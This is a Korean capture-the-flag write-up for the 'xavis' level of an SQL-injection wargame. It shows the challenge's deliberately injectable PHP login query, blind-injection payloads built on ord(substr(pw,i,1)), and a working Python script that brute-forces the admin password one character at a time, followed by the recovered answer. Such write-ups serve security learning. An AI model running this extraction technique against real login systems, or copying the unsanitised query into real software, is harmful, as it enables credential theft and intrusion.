# xavis

## 1. Code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
```

## 2. Condition
- `regex`와 `like`를 필터링한다. (..?)

## 3. Solution

이번 문제는 상당히 애를 먹었던 문제이다.<br>
우선, 하나 말하자면 패스워드는 유니코드다.<br>
`_`가 필터링되지 않았다면, `bit_length`함수를 통해 쉽게 알 수 있었겠다.<br>


<br>
`ascii`함수는 안되고 `ord`는 되는 모습을 보고 유니코드임을 직감하였다.<br>


그 많은 범위를 다 확인해볼 시간적 여유가 없기때문에, `BMP`부분(Basic Multilingual Plane)을 확인해보았다.<br>
그 중에서도 크게 0x100씩 범위를 지정하여 대소비교를 해주어, 세분화 시켰다.<br>

변수명 | 값
---|---
`pw` | 1234' or id='admin' and ord(substr(pw,i,1))>j #



<br>이후, 찾은 범위 내에서 정확한 값을 찾았다.<br>
빈 문자열인 경우 0을 반환하기에, 0이 나올때 까지 진행하였다.<br>

변수명 | 값
---|---
`pw` | 1234' or id='admin' and ord(substr(pw,i,1))=j #



스크립트 속 변수 `i`와 `j`를 두는데, 역할은 다음과 같다.
변수명 | 값
---|---
`i` | pw의 한 문자 index
`j` | 문자 값 비교를 위한 변수 (0x00 ~ 0xffff)


```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

fin_flag = False
pw_value = ""
for i in range(20):
    for j in range(0x00, 0x10000, 0x100):
        url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?\
                pw=1234' or id='admin' and ord(substr(pw,%d,1))<%d %%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            range_st = j - 0x100
            range_fin = j
            print("pw(%d) in %s ~ %s" % (i+1, hex(range_st), hex(range_fin)))
            break
    
    for j in range(range_st, range_fin+1):
        url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?\
                pw=1234' or id='admin' and ord(substr(pw,%d,1))=%d %%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            if (j==0):
                print("done!")
                fin_flag = True
                break
                
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
    
    if(fin_flag):
        break
            
print("pw :", pw_value)
```

스크립트 결과는 다음과 같다.
```
pw(1) in 0xc600 ~ 0xc700
pw(1) : 우
pw(2) in 0xc600 ~ 0xc700
pw(2) : 우왕
pw(3) in 0xad00 ~ 0xae00
pw(3) : 우왕굳
pw(4) in 0x0 ~ 0x100
done!
pw : 우왕굳
```



나온 pw 값을 최종적으로 대입해 보면 문제가 해결된다.
변수명 | 값
---|---
`pw` | 우왕굳